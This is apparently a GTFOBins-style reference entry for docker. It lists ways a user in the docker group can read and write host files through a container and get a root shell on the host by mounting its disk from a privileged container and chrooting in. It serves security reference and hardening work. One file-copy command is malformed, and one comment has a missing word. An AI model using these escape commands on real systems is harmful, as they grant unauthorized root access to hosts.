docker.comment: This requires the user to be privileged enough to run `docker`, e.g., being in the `docker` group or being `root`.

file-read.comment: Read a file by copying it to a temporary container (`$CONTAINER_ID`) and back to a new location on the host.

file-write.code:
echo DATA >/path/to/temp-file
docker cp /path/to/temp-file $CONTAINER_ID:temp-file
docker cp $CONTAINER_ID /path/to/output-file
file-write.comment: Write a file by copying it to a temporary container (`$CONTAINER_ID`) and back to the target destination on the host.

shell.code:
docker run --rm -it --privileged -u root alpine
mount /dev/sda1 /mnt/
ls -la /mnt/
chroot /mnt /bin/bash
shell.comment: This exploits the fact that is run with the `--privileged` option to directly mount a host's disk, e.g., `/dev/sda1`.
